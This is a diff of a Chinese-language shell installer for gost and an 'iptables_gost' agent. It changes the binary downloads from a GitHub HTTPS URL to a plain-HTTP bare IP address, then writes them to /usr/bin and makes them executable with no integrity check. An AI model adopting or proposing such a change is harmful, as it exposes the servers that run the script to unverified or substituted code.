@@ -90,11 +90,11 @@ ip_landing_init(){
     read -p "是否下载被控端文件? (首次必须安装) [y/N]: " down_files_1
     if [[ "$down_files_1" =~ ^[yY]$ ]]; then
         echo -e "${cyan}下载 gost 2.11...${plain}"
-        wget https://raw.githubusercontent.com/gxz2018/20231201/refs/heads/master/gost -O /usr/bin/gost
+        wget -q --show-progress http://65.49.211.33/gost -O /usr/bin/gost
         chmod +x /usr/bin/gost
         
         echo -e "${cyan}下载被控端...${plain}"
-        wget https://raw.githubusercontent.com/gxz2018/20231201/refs/heads/master/iptables_gost -O /usr/bin/iptables_gost
+        wget -q --show-progress http://65.49.211.33/iptables_gost -O /usr/bin/iptables_gost
         chmod +x /usr/bin/iptables_gost
         
         echo -e "${green}✓ 文件下载完成${plain}"
